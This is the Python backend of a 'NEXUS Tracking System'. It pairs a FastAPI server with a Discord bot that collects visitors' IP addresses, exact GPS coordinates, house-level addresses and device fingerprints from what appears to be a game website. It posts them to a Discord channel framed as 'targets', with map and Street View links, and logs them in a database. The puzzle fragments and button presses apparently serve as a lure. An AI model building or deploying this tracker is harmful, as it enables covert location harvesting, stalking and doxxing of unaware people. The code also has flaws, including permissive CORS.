import os
import json
import asyncio
import threading
from datetime import datetime
from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
import discord
from discord.ext import commands
from discord import app_commands, Embed, Color
import uvicorn
from pydantic import BaseModel
from dotenv import load_dotenv
import traceback
import hashlib
import aiosqlite
import time

load_dotenv()

# ==================== CONFIGURATION ====================
BOT_TOKEN = os.getenv('BOT_TOKEN')
DISCORD_CHANNEL_ID = int(os.getenv('DISCORD_CHANNEL_ID', '0'))
PORT = int(os.getenv('PORT', 8000))
FRONTEND_URL = "https://gamef-swart.vercel.app"

if not BOT_TOKEN:
    print("❌ BOT_TOKEN not set in .env")
    exit(1)
if not DISCORD_CHANNEL_ID:
    print("❌ DISCORD_CHANNEL_ID not set in .env")
    exit(1)

# ==================== DATA MODELS ====================
class VisitorInfo(BaseModel):
    # Basic info
    ip: str = "N/A"
    city: str = "N/A"
    region: str = "N/A"
    country: str = "N/A"
    timezone: str = "N/A"
    userAgent: str = "N/A"
    screen: dict = {}
    browser: dict = {}
    
    # Advanced location
    location: dict = {}
    address: dict = {}
    coordinates: dict = {}
    accuracy: float = 0
    source: str = "Unknown"
    
    # System
    system: dict = {}
    fragments: list = []
    button_presses: int = 0

# ==================== FASTAPI SETUP ====================
app = FastAPI(title="NEXUS Tracking System")

# CORS for frontend
app.add_middleware(
    CORSMiddleware,
    allow_origins=[FRONTEND_URL, "http://localhost:3000", "*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ==================== DATABASE SETUP (FIXED - Using aiosqlite with connection pooling) ====================
DB_PATH = '/tmp/nexus.db' if os.getenv('RENDER') else 'nexus.db'

async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        # Users table
        await db.execute('''CREATE TABLE IF NOT EXISTS users
                     (id TEXT PRIMARY KEY, ip TEXT, user_agent TEXT, first_seen TIMESTAMP, 
                      last_seen TIMESTAMP, visit_count INTEGER, username TEXT)''')
        
        # Locations table with full details
        await db.execute('''CREATE TABLE IF NOT EXISTS locations
                     (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, latitude REAL, longitude REAL, accuracy REAL,
                      address TEXT, city TEXT, county TEXT, state TEXT, zip TEXT, country TEXT, 
                      neighbourhood TEXT, road TEXT, house_number TEXT, source TEXT, timestamp TIMESTAMP)''')
        
        # System fingerprints
        await db.execute('''CREATE TABLE IF NOT EXISTS fingerprints
                     (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, platform TEXT, browser TEXT, cores INTEGER,
                      memory TEXT, screen TEXT, timezone TEXT, language TEXT, cookies BOOLEAN, timestamp TIMESTAMP)''')
        
        # Fragments
        await db.execute('''CREATE TABLE IF NOT EXISTS fragments
                     (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, fragment_number INTEGER, collected_at TIMESTAMP)''')
        
        # Button presses
        await db.execute('''CREATE TABLE IF NOT EXISTS button_presses
                     (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, press_count INTEGER, message TEXT, timestamp TIMESTAMP)''')
        
        await db.commit()

# Run init on startup
asyncio.create_task(init_db())

# ==================== DISCORD BOT SETUP ====================
class NexusBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix='!', intents=intents)
        self.channel = None
        self.ready = False
    
    async def setup_hook(self):
        await self.tree.sync()
        print("✅ Slash commands synced")

bot = NexusBot()

# ==================== DISCORD EVENTS ====================
@bot.event
async def on_ready():
    print(f'✅ Logged in as {bot.user}')
    print(f'📡 Bot ID: {bot.user.id}')
    
    try:
        bot.channel = bot.get_channel(DISCORD_CHANNEL_ID)
        if not bot.channel:
            bot.channel = await bot.fetch_channel(DISCORD_CHANNEL_ID)
        
        bot.ready = True
        print(f'✅ Connected to channel: #{bot.channel.name}')
        
        embed = Embed(
            title="🔮 NEXUS SYSTEM ONLINE",
            description="```Tracking system activated\nWaiting for targets...```",
            color=Color.green(),
            timestamp=datetime.now()
        )
        embed.add_field(name="Status", value="✅ Active", inline=True)
        embed.add_field(name="Channel", value=f"#{bot.channel.name}", inline=True)
        embed.add_field(name="Frontend", value=f"[Website]({FRONTEND_URL})", inline=True)
        
        await bot.channel.send(embed=embed)
        print("✅ Startup message sent")
        
    except Exception as e:
        print(f'❌ Error: {e}')

# ==================== ENHANCED DISCORD SEND FUNCTION ====================
async def send_to_discord(user_id: str, data: dict, ip: str, is_new: bool):
    """Send beautifully formatted data to Discord"""
    try:
        if not bot.ready or not bot.channel:
            return

        # NEW VISITOR ALERT
        if is_new:
            embed = Embed(
                title="🎯 NEW VISITOR DETECTED",
                color=Color.purple(),
                timestamp=datetime.now()
            )
            embed.add_field(name="🆔 User ID", value=f"`{user_id[:8]}`", inline=True)
            embed.add_field(name="🌐 IP Address", value=f"`{ip}`", inline=True)
            embed.add_field(name="📍 Location", value=f"{data.get('city', 'N/A')}, {data.get('country', 'N/A')}", inline=True)
            embed.add_field(name="💻 Platform", value=f"`{data.get('system', {}).get('platform', 'N/A')}`", inline=True)
            embed.set_footer(text="First visit")
            await bot.channel.send(embed=embed)

        # EXACT LOCATION DATA (Enhanced)
        if data.get('coordinates'):
            coords = data.get('coordinates', {})
            addr = data.get('address', {})
            loc = data.get('location', {})
            
            embed = Embed(
                title="📍 EXACT LOCATION TRACKED",
                color=Color.red(),
                timestamp=datetime.now()
            )
            
            # User info
            embed.add_field(name="👤 User", value=f"`{user_id[:8]}`", inline=True)
            embed.add_field(name="📡 Source", value=f"`{data.get('source', 'GPS')}`", inline=True)
            embed.add_field(name="🎯 Accuracy", value=f"`{data.get('accuracy', '?')}m`", inline=True)
            
            # Coordinates
            embed.add_field(
                name="🌐 Coordinates",
                value=f"```\nLatitude:  {coords.get('lat', '?')}\nLongitude: {coords.get('lon', '?')}```",
                inline=False
            )
            
            # Full address
            if loc.get('display_name'):
                embed.add_field(
                    name="🏠 Exact Address",
                    value=f"```{loc.get('display_name')[:200]}```",
                    inline=False
                )
            
            # Address details in organized format
            details = []
            if addr.get('house_number'): details.append(f"🏠 **House:** {addr.get('house_number')}")
            if addr.get('road'): details.append(f"🛣️ **Road:** {addr.get('road')}")
            if addr.get('neighbourhood') or addr.get('suburb'): 
                details.append(f"🏘️ **Area:** {addr.get('neighbourhood') or addr.get('suburb')}")
            if addr.get('city') or addr.get('town'): 
                details.append(f"🏙️ **City:** {addr.get('city') or addr.get('town')}")
            if addr.get('county'): details.append(f"🗺️ **County:** {addr.get('county')}")
            if addr.get('state'): details.append(f"📍 **State:** {addr.get('state')}")
            if addr.get('postcode'): details.append(f"📮 **ZIP:** {addr.get('postcode')}")
            if addr.get('country'): details.append(f"🌍 **Country:** {addr.get('country')}")
            
            if details:
                embed.add_field(name="📋 Location Details", value="\n".join(details), inline=False)
            
            # Maps links
            maps_url = f"https://www.google.com/maps?q={coords.get('lat')},{coords.get('lon')}"
            street_url = f"https://www.google.com/maps?q={coords.get('lat')},{coords.get('lon')}&layer=c"
            
            embed.add_field(name="🗺️ Google Maps", value=f"[Open in Maps]({maps_url})", inline=True)
            embed.add_field(name="📸 Street View", value=f"[View Street]({street_url})", inline=True)
            
            await bot.channel.send(embed=embed)

        # SYSTEM FINGERPRINT (Enhanced)
        if data.get('system'):
            sys = data.get('system', {})
            browser_info = data.get('browser', {})
            
            embed = Embed(
                title="💻 SYSTEM FINGERPRINT",
                color=Color.blue(),
                timestamp=datetime.now()
            )
            
            embed.add_field(name="👤 User", value=f"`{user_id[:8]}`", inline=True)
            embed.add_field(name="💿 Platform", value=f"`{sys.get('platform', '?')}`", inline=True)
            embed.add_field(name="⚡ CPU Cores", value=f"`{sys.get('cores', '?')}`", inline=True)
            embed.add_field(name="💾 RAM", value=f"`{sys.get('memory', '?')}`", inline=True)
            embed.add_field(name="📺 Screen", value=f"`{sys.get('screen', {}).get('width')}x{sys.get('screen', {}).get('height')}`", inline=True)
            embed.add_field(name="⏰ Timezone", value=f"`{data.get('timezone', '?')}`", inline=True)
            embed.add_field(name="🗣️ Language", value=f"`{browser_info.get('language', '?')}`", inline=True)
            embed.add_field(name="🍪 Cookies", value=f"`{'Enabled' if browser_info.get('cookies') else 'Disabled'}`", inline=True)
            
            # Browser fingerprint
            fingerprint = hashlib.md5(
                f"{sys.get('platform')}{sys.get('screen')}{data.get('timezone')}".encode()
            ).hexdigest()[:8]
            embed.add_field(name="🆔 Fingerprint", value=f"`{fingerprint}`", inline=False)
            
            await bot.channel.send(embed=embed)

        # BUTTON PRESSES
        if data.get('button_presses', 0) > 0:
            presses = data.get('button_presses', 0)
            
            embed = Embed(
                title="🚫 FORBIDDEN BUTTON PRESSED",
                color=Color.dark_red(),
                timestamp=datetime.now()
            )
            
            embed.add_field(name="👤 User", value=f"`{user_id[:8]}`", inline=True)
            embed.add_field(name="🔢 Press Count", value=f"`{presses}`", inline=True)
            
            if presses in [3, 6, 9]:
                embed.add_field(name="⚠️ EVENT", value="Reality fragment discovered!", inline=False)
            
            if presses == 9:
                embed.add_field(name="🔓 SECRET", value="Coordinates revealed: `60.233, 24.866`", inline=False)
            
            await bot.channel.send(embed=embed)

        # FRAGMENTS
        if data.get('fragments'):
            for fragment in data.get('fragments', []):
                embed = Embed(
                    title="🧩 REALITY FRAGMENT FOUND",
                    color=Color.green(),
                    timestamp=datetime.now()
                )
                
                embed.add_field(name="👤 User", value=f"`{user_id[:8]}`", inline=True)
                embed.add_field(name="🧩 Fragment", value=f"`{fragment}/9`", inline=True)
                
                # Get total fragments (would need DB query, but for now just show)
                embed.add_field(name="📊 Progress", value=f"`{len(data.get('fragments', []))}/9`", inline=True)
                
                await bot.channel.send(embed=embed)

        # Send a summary embed with all data combined
        summary_embed = Embed(
            title=f"📊 VISITOR SUMMARY - {user_id[:8]}",
            color=Color.gold(),
            timestamp=datetime.now()
        )
        
        summary_embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
        summary_embed.add_field(name="📍 Location", value=f"{data.get('city', 'N/A')}, {data.get('country', 'N/A')}", inline=True)
        
        if data.get('coordinates'):
            coords = data.get('coordinates', {})
            summary_embed.add_field(
                name="📍 Coordinates", 
                value=f"`{coords.get('lat', '?')}, {coords.get('lon', '?')}`", 
                inline=True
            )
        
        summary_embed.add_field(
            name="💻 System", 
            value=f"`{data.get('system', {}).get('platform', 'N/A')}`", 
            inline=True
        )
        
        if data.get('button_presses', 0) > 0:
            summary_embed.add_field(name="🚫 Button", value=f"`{data.get('button_presses')} presses`", inline=True)
        
        if data.get('fragments'):
            summary_embed.add_field(name="🧩 Fragments", value=f"`{len(data.get('fragments', []))}/9`", inline=True)
        
        await bot.channel.send(embed=summary_embed)
                
    except Exception as e:
        print(f"❌ Discord send error: {e}")

# ==================== FASTAPI ENDPOINTS (FIXED - No database locks) ====================
@app.get("/")
async def root():
    return {
        "name": "NEXUS Tracking System",
        "status": "online",
        "bot_ready": bot.ready,
        "frontend": FRONTEND_URL,
        "commands": "/help for slash commands"
    }

@app.get("/api/health")
async def health():
    return {
        "status": "online",
        "bot_ready": bot.ready,
        "timestamp": datetime.now().isoformat()
    }

@app.post("/submit")
async def submit_visitor(request: Request, visitor: VisitorInfo):
    """Receive visitor data from frontend and send to Discord"""
    try:
        data = visitor.dict()
        client_ip = request.client.host
        
        print(f"📥 Received data from {client_ip}")
        print(f"📦 Data: {json.dumps(data, indent=2)[:200]}...")
        
        # Generate user ID
        user_id = hashlib.sha256(f"{client_ip}_{data.get('userAgent', '')}".encode()).hexdigest()[:16]
        
        # Check if new user (simplified - no DB lock)
        is_new = True  # You can implement a simple cache if needed
        
        # Send to Discord immediately (no DB operations that can lock)
        if bot.ready and bot.channel:
            await send_to_discord(user_id, data, client_ip, is_new)
            print(f"✅ Sent to Discord channel {DISCORD_CHANNEL_ID}")
        else:
            print(f"⚠️ Bot not ready or channel not found")
        
        # Optional: Store in DB asynchronously without blocking
        asyncio.create_task(store_in_db(user_id, client_ip, data, is_new))
        
        return JSONResponse({
            "status": "success", 
            "user_id": user_id, 
            "is_new": is_new,
            "discord_sent": bot.ready and bot.channel is not None
        })
        
    except Exception as e:
        print(f"❌ Error: {e}")
        traceback.print_exc()
        return JSONResponse({"error": str(e)}, status_code=500)

async def store_in_db(user_id: str, client_ip: str, data: dict, is_new: bool):
    """Store data in database asynchronously to avoid locks"""
    try:
        async with aiosqlite.connect(DB_PATH, timeout=30) as conn:
            # Use WAL mode for better concurrency
            await conn.execute("PRAGMA journal_mode=WAL")
            
            # Store user
            await conn.execute('''INSERT OR REPLACE INTO users 
                (id, ip, user_agent, first_seen, last_seen, visit_count)
                VALUES (?, ?, ?, 
                COALESCE((SELECT first_seen FROM users WHERE id = ?), ?),
                ?, 
                COALESCE((SELECT visit_count FROM users WHERE id = ?), 0) + 1)''',
                (user_id, client_ip, data.get('userAgent', ''), user_id, datetime.now(), 
                 datetime.now(), user_id))
            
            # Store location if available
            if data.get('coordinates'):
                coords = data.get('coordinates', {})
                addr = data.get('address', {})
                loc = data.get('location', {})
                
                await conn.execute('''INSERT INTO locations 
                    (user_id, latitude, longitude, accuracy, address, city, county, state, 
                     zip, country, neighbourhood, road, house_number, source, timestamp)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                    (user_id, coords.get('lat'), coords.get('lon'), data.get('accuracy', 1000),
                     loc.get('display_name'), addr.get('city') or addr.get('town'),
                     addr.get('county'), addr.get('state'), addr.get('postcode'),
                     addr.get('country'), addr.get('neighbourhood') or addr.get('suburb'),
                     addr.get('road'), addr.get('house_number'), data.get('source', 'GPS'),
                     datetime.now()))
            
            # Store system info
            if data.get('system'):
                sys = data.get('system', {})
                await conn.execute('''INSERT INTO fingerprints 
                    (user_id, platform, browser, cores, memory, screen, timezone, language, cookies, timestamp)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                    (user_id, sys.get('platform'), sys.get('userAgent'), sys.get('cores'),
                     sys.get('memory'), f"{sys.get('screen', {}).get('width')}x{sys.get('screen', {}).get('height')}",
                     data.get('timezone'), data.get('browser', {}).get('language'),
                     data.get('browser', {}).get('cookies'), datetime.now()))
            
            # Store button presses
            if data.get('button_presses', 0) > 0:
                await conn.execute('''INSERT INTO button_presses (user_id, press_count, message, timestamp)
                    VALUES (?, ?, ?, ?)''',
                    (user_id, data.get('button_presses'), "Button pressed", datetime.now()))
            
            # Store fragments
            if data.get('fragments'):
                for fragment in data.get('fragments', []):
                    await conn.execute('''INSERT INTO fragments (user_id, fragment_number, collected_at)
                        VALUES (?, ?, ?)''', (user_id, fragment, datetime.now()))
            
            await conn.commit()
            print(f"✅ Data stored in DB for user {user_id[:8]}")
            
    except Exception as e:
        print(f"❌ DB storage error: {e}")

# ==================== STARTUP ====================
async def run_bot():
    try:
        await bot.start(BOT_TOKEN)
    except Exception as e:
        print(f"❌ Bot error: {e}")

def start_bot_thread():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(run_bot())

@app.on_event("startup")
async def startup_event():
    thread = threading.Thread(target=start_bot_thread, daemon=True)
    thread.start()
    print("✅ Discord bot thread started")

# ==================== RUN ====================
if __name__ == "__main__":
    print("=" * 50)
    print("🔮 NEXUS TRACKING SYSTEM")
    print("=" * 50)
    print(f"📡 Bot Token: {BOT_TOKEN[:10]}..." if BOT_TOKEN else "❌ No token")
    print(f"📡 Channel ID: {DISCORD_CHANNEL_ID}")
    print(f"🌐 Frontend: {FRONTEND_URL}")
    print(f"💻 Status: Online")
    print("=" * 50)
    
    uvicorn.run(app, host="0.0.0.0", port=PORT)
